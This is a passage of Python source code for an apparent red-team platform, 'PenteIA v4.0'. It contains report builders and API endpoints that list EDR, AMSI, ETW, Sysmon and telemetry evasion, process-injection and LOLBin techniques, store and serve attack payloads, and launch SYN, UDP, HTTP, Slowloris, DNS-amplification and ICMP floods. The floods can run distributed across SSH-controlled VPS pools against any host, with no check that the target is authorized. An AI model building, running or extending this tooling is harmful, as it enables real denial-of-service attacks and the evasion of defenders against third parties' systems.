        tid  = t.get("id", "")
        info = _TECH_LAYMAN.get(tid, (t.get("name", tid), t.get("detail", ""), "Consultar equipe técnica."))
        story.append(vuln_card(
            i, tid, info[0], info[1], info[2],
            t.get("cvss_severity", ""), t.get("cvss_score", 0),
            t.get("_target", "—"), t.get("compliance", []) or [],
        ))

    if ag_v:
        story.append(Paragraph("Vulnerabilidades Internas — Agente no Servidor", SECTION))
        story.append(hr(ORANG, 2, 6))
        story.append(Paragraph(
            "Estas falhas foram encontradas pelo agente PenteIA rodando dentro do servidor. "
            "Representam o risco para um atacante que já tenha obtido acesso inicial.", BODY))
        story.append(Spacer(1, 0.3*cm))
        for i, r in enumerate(ag_v, len(uniq) + 1):
            tid  = r.get("technique", "")
            info = _TECH_LAYMAN.get(tid, (r.get("name", tid), r.get("detail", ""), "Consultar equipe técnica."))
            story.append(vuln_card(
                i, tid, info[0], info[1], info[2],
                r.get("cvss_severity", "Medium"), r.get("cvss_score", 0),
                r.get("_host", "—"), [], r.get("detail", ""),
            ))

    # ═══════════════════════════════════════════════════════════════════════════
    # SEÇÃO: O QUE ESTÁ PROTEGIDO
    # ═══════════════════════════════════════════════════════════════════════════
    if safes:
        story.append(PageBreak())
        story.append(Paragraph("O Que Está Protegido", SECTION))
        story.append(hr(GREEN, 2, 6))
        story.append(Paragraph(
            "Controles de segurança testados e funcionando corretamente. "
            "Mantenha-os ativos e revise-os após qualquer atualização de sistema.", BODY))
        story.append(Spacer(1, 0.3*cm))

        seen2: set = set()
        ok_rows = [[Paragraph(h, S(f"OH{h[:3]}", fontSize=8, textColor=WHT, fontName="Helvetica-Bold", leading=11))
                    for h in ["Proteção", "O Que Garante", "Servidor"]]]
        for t in safes:
            k = t.get("id", "") + t.get("_target", "")
            if k in seen2:
                continue
            seen2.add(k)
            tid  = t.get("id", "")
            info = _TECH_LAYMAN.get(tid, (t.get("name", tid), "Controle ativo.", ""))
            ok_rows.append([
                Paragraph(info[0], S(f"OKN{tid[:6]}", fontSize=8, textColor=C("#0b5345"),
                                      fontName="Helvetica-Bold", leading=11)),
                Paragraph(t.get("detail", "")[:80], CAP),
                Paragraph(t.get("_target", "—"), CAP),
            ])
        ok = Table(ok_rows, colWidths=[5.2*cm, 8.8*cm, 3.2*cm])
        ok.setStyle(TableStyle([
            ("BACKGROUND",    (0,0),(-1,0), C("#0b5345")), ("TEXTCOLOR",(0,0),(-1,0),WHT),
            ("FONTSIZE",      (0,0),(-1,-1), 8.5),
            ("ROWBACKGROUNDS",(0,1),(-1,-1), [C("#eafaf1"), WHT]),
            ("GRID",          (0,0),(-1,-1), 0.3, GR2),
            ("TOPPADDING",    (0,0),(-1,-1), 7), ("BOTTOMPADDING",(0,0),(-1,-1),7),
            ("LEFTPADDING",   (0,0),(-1,-1),10), ("VALIGN",(0,0),(-1,-1),"TOP"),
        ]))
        story.append(ok)

    # ═══════════════════════════════════════════════════════════════════════════
    # PLANO DE AÇÃO
    # ═══════════════════════════════════════════════════════════════════════════
    story.append(PageBreak())
    story.append(Paragraph("Plano de Ação — Prioridades de Correção", SECTION))
    story.append(hr(TEAL, 2, 6))
    story.append(Paragraph(
        "Corrija os itens na ordem indicada. Comece pelos CRÍTICOS, depois ALTOS, depois MÉDIOS.", BODY))
    story.append(Spacer(1, 0.3*cm))

    all_act = uniq + ag_v
    if not all_act:
        story.append(Paragraph(
            "Nenhuma ação corretiva urgente identificada. Continue realizando testes periódicos.", BODY))

    for pn, (lbl, bc2, its) in enumerate([
        ("PRIORIDADE CRÍTICA — Corrigir Imediatamente",  CRED,  [t for t in all_act if t.get("cvss_severity") == "Critical"]),
        ("PRIORIDADE ALTA — Corrigir em até 7 dias",     ORANG, [t for t in all_act if t.get("cvss_severity") == "High"]),
        ("PRIORIDADE MÉDIA — Corrigir em até 30 dias",   YELLO, [t for t in all_act if t.get("cvss_severity") == "Medium"]),
        ("PRIORIDADE BAIXA — Melhorias Recomendadas",    TEAL,  [t for t in all_act
                                                                   if t.get("cvss_severity") not in ("Critical", "High", "Medium")]),
    ], 1):
        if not its:
            continue
        pb = Table([[Paragraph(f"  {pn}. {lbl}",
                               S(f"PB{pn}", fontSize=10, textColor=WHT, fontName="Helvetica-Bold", leading=14))]],
                   colWidths=[CW])
        pb.setStyle(TableStyle([
            ("BACKGROUND",  (0,0),(-1,-1), bc2),
            ("TOPPADDING",  (0,0),(-1,-1), 8), ("BOTTOMPADDING",(0,0),(-1,-1),8),
            ("LEFTPADDING", (0,0),(-1,-1),10), ("RIGHTPADDING",(0,0),(-1,-1),10),
        ]))
        story.append(pb)

        ar = []
        for t in its:
            tid  = t.get("id", "") or t.get("technique", "")
            info = _TECH_LAYMAN.get(tid, (t.get("name", tid), "", "Consultar equipe técnica."))
            ar.append([Paragraph(f"• {info[0]}", BOLD9), Paragraph(info[2], FIX)])
        at = Table(ar, colWidths=[5.5*cm, CW - 5.5*cm])
        at.setStyle(TableStyle([
            ("FONTSIZE",      (0,0),(-1,-1), 9),
            ("ROWBACKGROUNDS",(0,0),(-1,-1), [GR1, WHT]),
            ("GRID",          (0,0),(-1,-1), 0.3, GR2),
            ("TOPPADDING",    (0,0),(-1,-1), 7), ("BOTTOMPADDING",(0,0),(-1,-1),7),
            ("LEFTPADDING",   (0,0),(-1,-1),12), ("VALIGN",(0,0),(-1,-1),"TOP"),
        ]))
        story.append(at)
        story.append(Spacer(1, 0.3*cm))

    # ── Rodapé ───────────────────────────────────────────────────────────────
    story.append(Spacer(1, 0.5*cm))
    story.append(hr(GR3, 0.5, 6))
    ft = Table([[
        Paragraph("PenteIA v4.0 — Red Team Platform", CAP),
        Paragraph(f"Gerado em {generated_at[:19].replace('T', ' ')}",
                  S("FC", fontSize=7.5, textColor=GR3, leading=11, alignment=2)),
    ]], colWidths=[CW / 2] * 2)
    ft.setStyle(TableStyle([
        ("LEFTPADDING", (0,0),(-1,-1),0), ("RIGHTPADDING",(0,0),(-1,-1),0),
        ("TOPPADDING",  (0,0),(-1,-1),0), ("BOTTOMPADDING",(0,0),(-1,-1),0),
    ]))
    story.append(ft)
    story.append(Paragraph(
        "DOCUMENTO CONFIDENCIAL — Compartilhar somente com equipe autorizada. "
        "Testes realizados exclusivamente em ambientes com autorização expressa.", CAP))

    doc.build(story)
    return buf.getvalue()


def _build_docx(title: str, report_type: str, data: dict, generated_at: str) -> bytes:
    from docx import Document
    from docx.shared import Pt, RGBColor, Cm
    from docx.enum.text import WD_ALIGN_PARAGRAPH

    doc = Document()
    RED = RGBColor(0xC0, 0x39, 0x2B)
    GRAY = RGBColor(0x55, 0x55, 0x55)

    h = doc.add_heading(title, 0)
    h.runs[0].font.color.rgb = RED

    p = doc.add_paragraph(f"Tipo: {report_type}  |  Gerado em: {generated_at[:19].replace('T',' ')}")
    p.runs[0].font.size = Pt(9)
    p.runs[0].font.color.rgb = GRAY

    doc.add_paragraph()

    sims = data.get("simulations", [])
    if sims:
        h1 = doc.add_heading("Simulações BAS (MITRE ATT&CK)", 1)
        h1.runs[0].font.color.rgb = RED
        for sim in sims:
            doc.add_heading(f"Alvo: {sim['target']} — Score: {sim['score']}%", 2)
            doc.add_paragraph(f"Status: {sim['status']} | Técnicas: {sim['total']} | Vulnerabilidades: {sim['hits']}")
            techs = sim.get("techniques", [])
            if techs:
                tbl = doc.add_table(rows=1, cols=4)
                tbl.style = "Table Grid"
                hdr = tbl.rows[0].cells
                hdr[0].text = "ID MITRE"; hdr[1].text = "Técnica"; hdr[2].text = "Status"; hdr[3].text = "Detalhe"
                for cell in hdr:
                    for run in cell.paragraphs[0].runs:
                        run.font.bold = True
                for t in techs:
                    row = tbl.add_row().cells
                    row[0].text = t.get("id", "")
                    row[1].text = t.get("name", "")
                    row[2].text = t.get("status", "")
                    row[3].text = t.get("detail", "")[:80]
                doc.add_paragraph()

    beacons = data.get("beacons", [])
    if beacons:
        h1 = doc.add_heading("Agentes C2 Registrados", 1)
        h1.runs[0].font.color.rgb = RED
        tbl = doc.add_table(rows=1, cols=4)
        tbl.style = "Table Grid"
        hdr = tbl.rows[0].cells
        hdr[0].text = "Hostname"; hdr[1].text = "IP"; hdr[2].text = "Usuário"; hdr[3].text = "Status"
        for b in beacons:
            row = tbl.add_row().cells
            row[0].text = b["hostname"]; row[1].text = b["ip"]; row[2].text = b["user"]; row[3].text = b["status"]
        doc.add_paragraph()

    p = doc.add_paragraph("Confidencial — uso exclusivo em ambientes autorizados. PenteIA v4.0 © 2026")
    p.runs[0].font.size = Pt(8)
    p.runs[0].font.color.rgb = GRAY

    buf = io.BytesIO()
    doc.save(buf)
    return buf.getvalue()


def _build_xlsx(title: str, report_type: str, data: dict, generated_at: str) -> bytes:
    import openpyxl
    from openpyxl.styles import Font, PatternFill, Alignment, Border, Side
    from openpyxl.utils import get_column_letter

    wb = openpyxl.Workbook()
    RED_FILL = PatternFill("solid", fgColor="C0392B")
    GRAY_FILL = PatternFill("solid", fgColor="555555")
    LGRAY_FILL = PatternFill("solid", fgColor="F5F5F5")
    WHITE_FONT = Font(color="FFFFFF", bold=True)
    thin = Border(left=Side(style="thin"), right=Side(style="thin"), top=Side(style="thin"), bottom=Side(style="thin"))

    # Sheet 1: BAS Simulations
    ws = wb.active
    ws.title = "BAS Simulações"
    ws.append([f"PenteIA v4.0 — {title}"])
    ws["A1"].font = Font(bold=True, size=14, color="C0392B")
    ws.append([f"Tipo: {report_type} | Gerado: {generated_at[:19].replace('T',' ')}"])
    ws.append([])

    ws.append(["Alvo", "Score (%)", "Status", "Hits", "Total Técnicas", "Data"])
    for cell in ws[4]:
        cell.fill = RED_FILL; cell.font = WHITE_FONT; cell.alignment = Alignment(horizontal="center")
    for sim in data.get("simulations", []):
        ws.append([sim["target"], sim["score"], sim["status"], sim["hits"], sim["total"], sim["created_at"][:19]])

    ws.append([])
    ws.append(["ID MITRE", "Técnica", "Status", "Detalhe", "HTTP Status", "Alvo"])
    hdr_row = ws.max_row
    for cell in ws[hdr_row]:
        cell.fill = GRAY_FILL; cell.font = WHITE_FONT
    for sim in data.get("simulations", []):
        for t in sim.get("techniques", []):
            ws.append([t.get("id",""), t.get("name",""), t.get("status",""), t.get("detail",""), t.get("http_status",""), sim["target"]])

    for col in range(1, 7):
        ws.column_dimensions[get_column_letter(col)].width = [15, 30, 10, 50, 12, 20][col-1]

    # Sheet 2: C2 Beacons
    ws2 = wb.create_sheet("C2 Beacons")
    ws2.append(["Hostname", "IP", "Usuário", "Status"])
    for cell in ws2[1]:
        cell.fill = RED_FILL; cell.font = WHITE_FONT
    for b in data.get("beacons", []):
        ws2.append([b["hostname"], b["ip"], b["user"], b["status"]])
    for col in range(1, 5):
        ws2.column_dimensions[get_column_letter(col)].width = [25, 15, 20, 10][col-1]

    # Sheet 3: Listeners
    ws3 = wb.create_sheet("C2 Listeners")
    ws3.append(["Nome", "Host", "Porta", "Protocolo"])
    for cell in ws3[1]:
        cell.fill = GRAY_FILL; cell.font = WHITE_FONT
    for l in data.get("listeners", []):
        ws3.append([l["name"], l["host"], l["port"], l["protocol"]])

    # Sheet 4: Payloads
    ws4 = wb.create_sheet("Payloads")
    ws4.append(["Nome", "Tipo", "Tamanho"])
    for cell in ws4[1]:
        cell.fill = GRAY_FILL; cell.font = WHITE_FONT
    for p in data.get("payloads", []):
        ws4.append([p["name"], p["type"], p["size"]])

    buf = io.BytesIO()
    wb.save(buf)
    return buf.getvalue()


@app.post("/api/reporting/generate")
async def generate_report(
    req: ReportCreateRequest,
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    generated_at = datetime.utcnow().isoformat()
    report_data = _collect_report_data(current_user.id, db)
    report_data["generated_at"] = generated_at
    report_data["type"] = req.report_type
    report_data["title"] = req.title

    if _HAS_LLM:
        sims = report_data.get("simulations", [])
        done = [s for s in sims if s.get("status") == "completed"]
        if done:
            all_techs = [t for s in done for t in s.get("techniques", [])]
            vulns = [t for t in all_techs if t.get("status") == "found"]
            score = round(sum(s.get("score", 0) for s in done) / max(len(done), 1), 1)
            narrative_data = {
                "target": done[0].get("target", "alvo") if done else "alvo",
                "risk_score": score,
                "total_tests": len(all_techs),
                "found": len(vulns),
                "blocked": len([t for t in all_techs if t.get("status") in ("blocked", "safe")]),
                "detection_coverage_pct": round(len([t for t in all_techs if t.get("status") in ("blocked", "safe")]) / max(len(all_techs), 1) * 100, 1),
                "top_critical_techniques": [t.get("name", t.get("id", "")) for t in vulns if t.get("cvss_severity") in ("Critical", "High")][:5],
                "compliance": list({c for t in vulns for c in t.get("compliance", [])}),
            }
            try:
                report_data["executive_narrative"] = _llm_summarize(narrative_data, timeout=20)
            except Exception:
                pass

    report = Report(
        user_id=current_user.id, title=req.title, type=req.report_type, format=req.format,
        json_data=report_data
    )
    db.add(report)
    db.commit()
    _operation_logs.append({"module": "SYSTEM", "action": "Relatório gerado", "details": req.title, "timestamp": generated_at})
    _audit(db, "Reporting", "Relatório gerado", f"{req.title} ({req.report_type}/{req.format})", current_user.id)
    return {"id": report.id, "message": "Relatório gerado"}

@app.get("/api/reporting/reports")
async def get_reports(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    reports = db.query(Report).filter(Report.user_id == current_user.id).all()
    return {"reports": [
        {"id": r.id, "title": r.title, "type": r.type, "format": r.format, "created_at": r.created_at.isoformat()}
        for r in reports
    ]}

@app.get("/api/reporting/reports/{report_id}/download")
async def download_report(report_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    report = db.query(Report).filter(Report.id == report_id, Report.user_id == current_user.id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Relatório não encontrado")

    fmt = (report.format or "pdf").lower()
    data = report.json_data or {}
    title = report.title or "Relatório"
    generated_at = data.get("generated_at", datetime.utcnow().isoformat())

    try:
        if fmt in ("docx", "word"):
            content = _build_docx(title, report.type or "", data, generated_at)
            safe = _re.sub(r"[^a-zA-Z0-9_-]", "_", title)[:40]
            return StreamingResponse(io.BytesIO(content), media_type="application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                     headers={"Content-Disposition": f'attachment; filename="{safe}.docx"'})
        elif fmt in ("xlsx", "excel"):
            content = _build_xlsx(title, report.type or "", data, generated_at)
            safe = _re.sub(r"[^a-zA-Z0-9_-]", "_", title)[:40]
            return StreamingResponse(io.BytesIO(content), media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                                     headers={"Content-Disposition": f'attachment; filename="{safe}.xlsx"'})
        else:  # pdf (default)
            content = _build_pdf(title, report.type or "", data, generated_at)
            safe = _re.sub(r"[^a-zA-Z0-9_-]", "_", title)[:40]
            return StreamingResponse(io.BytesIO(content), media_type="application/pdf",
                                     headers={"Content-Disposition": f'attachment; filename="{safe}.pdf"'})
    except Exception as e:
        # fallback to JSON if generation fails
        content = json.dumps(data, indent=2, ensure_ascii=False).encode("utf-8")
        return StreamingResponse(io.BytesIO(content), media_type="application/json",
                                 headers={"Content-Disposition": f'attachment; filename="report-{report.id}.json"'})

@app.delete("/api/reporting/reports/{report_id}")
async def delete_report(report_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    report = db.query(Report).filter(Report.id == report_id, Report.user_id == current_user.id).first()
    if not report:
        raise HTTPException(status_code=404, detail="Relatório não encontrado")
    db.delete(report)
    db.commit()
    return {"message": "Relatório deletado"}


# ── Evasion ──────────────────────────────────────────────────────────────────

@app.get("/api/evasion/techniques")
async def get_evasion_techniques(current_user: User = Depends(get_current_user)):
    return {
        "techniques": [
            {
                "id": "edr-evasion",
                "name": "EDR Evasion",
                "category": "EDR Evasion",
                "mitre_id": "T1562.001",
                "platform": "windows",
                "difficulty": "High",
                "payload_template": "pe_injector",
                "techniques": [
                    "ROP Gadget Chaining — encadeia gadgets ROP para desviar fluxo sem chamar APIs monitoradas",
                    "Indirect Syscalls — chama syscalls do kernel diretamente, evitando hooks do EDR em ntdll.dll",
                    "Module Stomping — sobrescreve módulo legítimo em memória para mascarar shellcode",
                    "Sandbox Detection — detecta ambiente de análise por latência de CPU/mouse/rede e para execução",
                    "Heaven's Gate (32→64 bit) — alterna entre modo 32/64bit para escapar de hooks de userland",
                    "Usermode API Unhooking — remove hooks do EDR restaurando bytes originais de ntdll.dll",
                ]
            },
            {
                "id": "memory-evasion",
                "name": "Memory Evasion",
                "category": "Memory Evasion",
                "mitre_id": "T1055",
                "platform": "windows",
                "difficulty": "High",
                "payload_template": "reflective_loader",
                "techniques": [
                    "Sleep Obfuscation (Ekko) — cifra shellcode em memória durante sleeps para escapar de memory scans",
                    "Thread Stack Spoofing — falsifica call stack da thread para ocultar origem do shellcode",
                    "APC Queue Abuse — injeta shellcode via APC em thread alerta, sem criar thread nova",
                    "HeapEncrypt — mantém payload cifrado no heap, decifra só no momento de execução",
                    "Reflective DLL Loading — carrega DLL diretamente em memória sem chamar LoadLibrary/CreateFile",
                    "PE-to-Shellcode — converte PE em shellcode PIC para execução posição-independente",
                ]
            },
            {
                "id": "telemetry-bypass",
                "name": "Telemetry Bypass",
                "category": "Telemetry Bypass",
                "mitre_id": "T1562.006",
                "platform": "windows",
                "difficulty": "Medium",
                "payload_template": "dll_sideload",
                "techniques": [
                    "AMSI Bypass (Patchless) — corrompe AMSI via ponteiro de contexto sem patching em memória",
                    "ETW Provider Disable — desabilita provedores ETW via NtTraceControl para cegar SIEM",
                    "Event Log Manipulation — suspende serviço de log ou limpa canal Security/System via WevtAPI",
                    "Sysmon Blind — sobrescreve região de memória do Sysmon para criar ponto cego em registry events",
                    "WMI Subscription Abuse — usa WMI para persistência sem criar processos filhos visíveis",
                    "PPL Bypass — contorna Protected Process Light para injetar em processos protegidos (antivírus)",
                ]
            },
            {
                "id": "process-injection",
                "name": "Process Injection",
                "category": "Process Injection",
                "mitre_id": "T1055",
                "platform": "windows",
                "difficulty": "Medium",
                "payload_template": "pe_injector",
                "techniques": [
                    "Classic DLL Injection — WriteProcessMemory + CreateRemoteThread no processo alvo",
                    "Process Hollowing — substitui memória de processo legítimo suspenso (T1055.012)",
                    "Early Bird APC — injeta via APC antes do thread principal executar, pre-EP",
                    "Phantom DLL Hollowing — injeta em DLL mapeada mas ainda não carregada pelo loader",
                    "Thread Hijacking — suspende thread existente, modifica CONTEXT.Rip, resume (T1055.003)",
                    "Module Overloading — carrega DLL legítima em módulo já carregado para mascarar atividade",
                ]
            },
            {
                "id": "lolbin-evasion",
                "name": "Living off the Land (LOLBins)",
                "category": "LOLBin Evasion",
                "mitre_id": "T1218",
                "platform": "windows",
                "difficulty": "Low",
                "payload_template": "hta_runner",
                "techniques": [
                    "mshta.exe — executa HTA/VBScript via binário legítimo da Microsoft (T1218.005)",
                    "regsvr32 squiblydoo — carrega COM scriptlet remoto sem toque em disco (T1218.010)",
                    "certutil decode — usa certutil para decodificar e dropar payload codificado em base64",
                    "msiexec /q — instala MSI malicioso silenciosamente via processo assinado Microsoft",
                    "wscript/cscript — executa VBScript/JScript de payload inicial (T1059.005)",
                    "forfiles /p — executa comando arbitrário via utilitário de busca de arquivos",
                ]
            },
            {
                "id": "initial-access-evasion",
                "name": "Initial Access Evasion",
                "category": "Initial Access Evasion",
                "mitre_id": "T1566",
                "platform": "all",
                "difficulty": "Medium",
                "payload_template": "vba_macro",
                "techniques": [
                    "VBA Stomping — remove código VBA de origem mantendo p-code compilado para evadir análise estática",
                    "XLM Macro (Excel 4.0) — usa macros legadas do Excel 4.0, raramente detectadas por sandboxes",
                    "LNK Dropper — arquivo de atalho (.lnk) com target malicioso distribuído via email/USB",
                    "ISO/IMG Container — usa container de imagem de disco para bypassar Mark-of-the-Web (T1553.005)",
                    "HTML Smuggling — monta payload no browser via JavaScript, evita inspeção de proxy",
                    "PDF with JS — embute JavaScript em PDF para execução silenciosa no Adobe Reader",
                ]
            },
            {
                "id": "network-evasion",
                "name": "Network & C2 Evasion",
                "category": "Network Evasion",
                "mitre_id": "T1573",
                "platform": "all",
                "difficulty": "High",
                "payload_template": "rev_shell_stub",
                "techniques": [
                    "Domain Fronting — usa CDN (CloudFront/Akamai) para ocultar C2 atrás de domínio legítimo (T1090.004)",
                    "DNS-over-HTTPS C2 — usa DoH para comunicação C2 indetectável por DPI clássico",
                    "HTTPS Certificate Impersonation — usa cert TLS de marca conhecida (Microsoft, Google) para C2",
                    "Jitter + Sleep — randomiza beacon interval (jitter %) para evadir análise de tráfego periódico",
                    "Protocol Mimicry — encapsula C2 em protocolo legítimo (HTTP2, WebSocket, gRPC)",
                    "Traffic Padding — adiciona dados aleatórios para frustrar fingerprinting de payload por tamanho",
                ]
            },
        ]
    }

@app.get("/api/evasion/payloads")
async def get_payloads(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    payloads = db.query(Payload).filter(Payload.user_id == current_user.id).all()
    return {"payloads": [
        {"id": p.id, "name": p.name, "type": p.type, "size": p.size, "created_at": p.created_at.isoformat()}
        for p in payloads
    ]}

@app.post("/api/evasion/payloads")
async def upload_payload(
    name: str, payload_type: str, file: UploadFile = File(...),
    current_user: User = Depends(get_current_user), db: Session = Depends(get_db)
):
    content = await file.read()
    payload = Payload(user_id=current_user.id, name=name, type=payload_type, size=f"{len(content)} bytes", content=content)
    db.add(payload)
    db.commit()
    return {"id": payload.id, "message": "Payload enviado"}

@app.get("/api/evasion/payloads/{payload_id}/download")
async def download_payload(payload_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    payload = db.query(Payload).filter(Payload.id == payload_id, Payload.user_id == current_user.id).first()
    if not payload:
        raise HTTPException(status_code=404, detail="Payload não encontrado")
    return StreamingResponse(
        io.BytesIO(payload.content or b""),
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{payload.name}"'},
    )

@app.delete("/api/evasion/payloads/{payload_id}")
async def delete_payload(payload_id: str, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    payload = db.query(Payload).filter(Payload.id == payload_id, Payload.user_id == current_user.id).first()
    if not payload:
        raise HTTPException(status_code=404, detail="Payload não encontrado")
    db.delete(payload)
    db.commit()
    return {"message": "Payload deletado"}


# ── DDoS ─────────────────────────────────────────────────────────────────────

def _cleanup_old_ssh_tests():
    """Remove ssh tests que já terminaram e têm mais de 10 minutos."""
    cutoff = datetime.utcnow()
    to_del = []
    for tid, entry in list(_ssh_tests.items()):
        if not entry['thread'].is_alive():
            try:
                age = (cutoff - datetime.fromisoformat(entry['started_at'])).total_seconds()
                if age > 600:
                    to_del.append(tid)
            except Exception:
                to_del.append(tid)
    for tid in to_del:
        del _ssh_tests[tid]

@app.get("/api/ddos/methods")
async def get_ddos_methods():
    return {"methods": [
        {"name": "SYN Flood",         "value": "syn_flood",         "layer": "Layer 4 TCP",
         "desc": "Raw TCP SYN packets; enche a fila de conexões. Requer admin para raw sockets."},
        {"name": "UDP Flood",         "value": "udp_flood",         "layer": "Layer 4 UDP",
         "desc": "Pacotes UDP com payload variável; consome bandwidth. Multi-threaded."},
        {"name": "HTTP Flood",        "value": "http_flood",        "layer": "Layer 7",
         "desc": "Requisições HTTP com UA/path aleatórios; exaure conexões da aplicação."},
        {"name": "Slowloris",         "value": "slowloris",         "layer": "Layer 7",
         "desc": "Mantém centenas de conexões semi-abertas; esgota o pool de threads do servidor."},
        {"name": "DNS Amplification", "value": "dns_amplification", "layer": "Layer 3",
         "desc": "Envia queries DNS reais (ANY/TXT) para o alvo; ideal para testar servidores DNS."},
        {"name": "ICMP Flood",        "value": "icmp_flood",        "layer": "Layer 3",
         "desc": "Flood de ICMP Echo Request (ping). Requer admin; fallback UDP automático."},
    ]}

@app.post("/api/ddos/proxy/test")
async def test_ssh_proxy(req: SSHProxyTestRequest, current_user: User = Depends(get_current_user)):
    cfg = SSHProxyConfig(host=req.host, port=req.port, user=req.user, password=req.password)
    result = SSHProxyExecutor(cfg).test_connection()
    if not result.get('ok'):
        raise HTTPException(status_code=400, detail=result.get('error', 'Falha na conexão SSH'))
    return result

@app.post("/api/ddos/proxy/diag")
async def diag_ssh_proxy(req: SSHProxyTestRequest, current_user: User = Depends(get_current_user)):
    cfg = SSHProxyConfig(host=req.host, port=req.port, user=req.user, password=req.password)
    result = await asyncio.get_event_loop().run_in_executor(
        None, SSHProxyExecutor(cfg).get_diagnostics
    )
    if not result.get('ok'):
        raise HTTPException(status_code=400, detail=result.get('error', 'Falha na conexão SSH'))
    return result

@app.post("/api/ddos/start")
async def start_ddos(req: DDoSStartRequest, current_user: User = Depends(get_current_user)):
    # Resolve domain → IP (necessário para métodos Layer 3/4 que usam raw sockets)
    try:
        resolved_host = await asyncio.get_event_loop().run_in_executor(
            None, _socket.gethostbyname, req.target_host
        )
    except _socket.gaierror:
        raise HTTPException(status_code=400, detail=f"Não foi possível resolver o host: {req.target_host}")

    via_label = "local" if req.use_local else ("SSH" if req.use_ssh_proxy else "direto")
    _operation_logs.append({
        "module": "DDoS", "action": "Teste iniciado",
        "details": f"{req.target_host}({resolved_host}):{req.target_port} ({req.method}) via {via_label}",
        "timestamp": datetime.utcnow().isoformat(),
    })

    if req.use_local:
        _cleanup_old_ssh_tests()
        executor = LocalFloodExecutor()
        thread, result = executor.start_test(
            target_host=req.target_host, target_port=req.target_port,
            method=req.method, duration=req.duration, pps=req.pps, threads=req.threads,
            endpoints=req.endpoints,
        )
        test_id = f"local_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
        _ssh_tests[test_id] = {
            'thread': thread, 'result': result,
            'started_at': datetime.utcnow().isoformat(),
            'executor': None,
        }
        if result.get('status') == 'port_closed':
            return {"test_id": test_id, "status": "port_closed", "via": "local",
                    "error": result.get('error', '')}
        return {"test_id": test_id, "status": "started", "via": "local"}

    if req.use_ssh_proxy and req.ssh_host:
        _cleanup_old_ssh_tests()
        cfg = SSHProxyConfig(
            host=req.ssh_host, port=req.ssh_port,
            user=req.ssh_user or '', password=req.ssh_pass or '',
        )
        executor = SSHProxyExecutor(cfg)
        thread, result = executor.start_test(
            target_host=req.target_host, target_port=req.target_port,
            method=req.method, duration=req.duration, pps=req.pps, threads=req.threads,
            endpoints=req.endpoints,
        )
        test_id = f"ssh_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
        _ssh_tests[test_id] = {
            'thread': thread, 'result': result,
            'started_at': datetime.utcnow().isoformat(),
            'executor': executor,
        }
        # port_closed: reporta imediatamente sem waiting
        if result.get('status') == 'port_closed':
            return {"test_id": test_id, "status": "port_closed", "via": "ssh_proxy",
                    "error": result.get('error', '')}
        return {"test_id": test_id, "status": "started", "via": "ssh_proxy"}

    config = DDoSConfig(
        target_host=req.target_host, target_port=req.target_port,
        method=DDoSMethod(req.method),
        duration_seconds=req.duration,
        packets_per_second=req.pps,
        threads=req.threads,
        payload_size=req.payload_size,
        connections=req.connections,
    )
    try:
        test_id = ddos_engine.start_test(config)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    return {"test_id": test_id, "status": "started"}

@app.get("/api/ddos/status/{test_id}")
async def get_ddos_status(test_id: str, current_user: User = Depends(get_current_user)):
    if test_id in _ssh_tests:
        entry = _ssh_tests[test_id]
        res   = entry['result']
        alive = entry['thread'].is_alive()
        # Calcula elapsed e taxas a partir do started_at
        try:
            started_ts = datetime.fromisoformat(entry['started_at'])
            elapsed    = (datetime.utcnow() - started_ts).total_seconds()
        except Exception:
            elapsed = 0.0
        pkts = res.get('packets', 0)
        reqs = res.get('requests', 0)
        errs = res.get('errors', 0)
        return {
            "test_id":       test_id,
            "status":        "running" if alive else res.get('status', 'completed'),
            "via":           "ssh_proxy",
            "started_at":    entry['started_at'],
            "packets_sent":  pkts,
            "requests_sent": reqs,
            "connections":   res.get('connections', 0),
            "errors_count":  errs,
            "bytes_sent":    0,
            "elapsed":       round(elapsed, 1),
            "pps":           round(pkts / elapsed, 1) if elapsed > 0 else 0.0,
            "rps":           round(reqs / elapsed, 1) if elapsed > 0 else 0.0,
            "mbps":          0.0,
            "vps_pid":       res.get('vps_pid'),
            "output":        res.get('output', ''),
            "error":         res.get('error', ''),
        }
    result = ddos_engine.get_test_status(test_id)
    if not result or result.get("error"):
        return {"status": "not_found"}
    return result

@app.post("/api/ddos/stop/{test_id}")
async def stop_ddos(test_id: str, current_user: User = Depends(get_current_user)):
    if test_id in _ssh_tests:
        entry = _ssh_tests[test_id]
        res = entry['result']
        executor = entry.get('executor')
        vps_pid = res.get('vps_pid')
        if executor and vps_pid and hasattr(executor, 'kill_test'):
            await asyncio.to_thread(executor.kill_test, vps_pid)
            res['status'] = 'stopped'
            return {"message": f"Processo VPS PID {vps_pid} encerrado"}
        # Local executor — sinaliza parada via stop_event e fecha sockets
        if executor and hasattr(executor, 'stop'):
            executor.stop()
        res['status'] = 'stopped'
        return {"message": "Executor local parado — sockets fechados"}
    ddos_engine.stop_test(test_id)
    return {"message": "Teste DDoS parado"}


@app.post("/api/ddos/pool/start")
async def start_ddos_pool(req: DDoSPoolStartRequest, current_user: User = Depends(get_current_user)):
    """Inicia ataque distribuído em múltiplos VPS simultaneamente."""
    if not req.vps_list:
        raise HTTPException(status_code=400, detail="Informe ao menos um VPS")

    configs = [SSHProxyConfig(host=v.host, port=v.port, user=v.user, password=v.password)
               for v in req.vps_list]
    pool = SSHProxyPool(configs)

    try:
        resolved_host = await asyncio.to_thread(_socket.gethostbyname, req.target_host)
    except Exception:
        resolved_host = req.target_host

    _operation_logs.append({
        "module": "DDoS", "action": "Pool attack",
        "details": f"{req.target_host}:{req.target_port} ({req.method}) — {len(configs)} VPS",
        "timestamp": datetime.utcnow().isoformat(),
    })

    nodes = pool.start_distributed_test(
        req.target_host, req.target_port, req.method, req.duration, req.pps, req.threads,
        endpoints=req.endpoints,
    )

    pool_id = f"pool_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
